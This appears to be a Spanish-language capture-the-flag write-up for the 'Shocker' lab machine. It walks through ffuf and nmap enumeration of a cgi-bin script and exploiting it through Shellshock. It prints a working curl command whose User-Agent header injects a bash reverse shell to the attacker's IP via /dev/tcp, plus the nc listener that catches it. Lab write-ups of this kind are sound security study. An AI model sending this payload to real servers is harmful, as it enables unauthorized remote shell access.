# Enumeracion 
Al existir el directorio /cgi-bin/ vamos a enumerar con [[FFUF]] archivos con extensiones ``.sh .pl .cgi`` 

```shell
ffuf -u http://PaginaWeb/cgi-bin/FUZZ -w Diccionario -e .sh,.pl,.cgi
Ejemplo practico: ffuf -u http://10.10.10.56/cgi-bin/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -e .sh,.pl,.cgi
```
![[Shocker6.png]]

Y da que en el directorio cgi-bin hay un archivo user.sh   `http://10.10.10.56/cgi-bin/user.sh`
Como estamos ante el directorio cgi-bin, ejecutamos un comando de enumaracion de shellshock de `nmap`:
```shell
nmap -p80 10.10.10.56 --script http-shellshock --script-args uri=/cgi-bin/user.sh
```
Dice que es vulnerable a shellshock, asi que ahora vamos a explotarlo
![[Shocker7.png]]


# Explotación

[Articulo de shellshock](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html)
Vamos a usar el comando de curl para mandar el payload
```shell
curl -s -X GET "http://Webvictima/cgi-bin/ArchivoVulnerable" -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/IpDeNuestraMaquina/Puerto 0>&1"
Ejemplo del comando: curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/10.10.16.6/443 0>&1"
```
*Parametros*
	`-s` Es de silent para no mostrar tanto output que no nos sirve
	`-X GET` es el metodo por el que vamos a enviar la peticion
	`-h` Es para podificar la cabecera que vamos a enviar que en este caso inyecta el payload

*Cosas atener en cuenta*
	acá no se usa el %26 para el & por que estamos dentro de bash y no se va a decodificar
	se pone el ;echo;echo para separar el payload malioso del comando, aveves

Esto va a ejecutar una revershell por lo que nos vamos a poner en escucha por el puerto 443 con [[nc -nlvp 443]]
```shell
nc -nlvp Puerto
Ejemplo: nc -nlvp 443
```
	
![[Shocker8.png]]



# Notas

## Extensiones .sh .pl. cgi
**.sh** El lenguaje es bash  
**.pl** Lenguaje Perl  
**.cgi** Common Gateway Interface Script

*¿Dónde se usan los archivos .cgi?*

- En servidores antiguos o simples que no usan PHP, Node.js, etc.
- En aplicaciones legacy que usan Perl o Bash.
- En entornos educativos o demostrativos.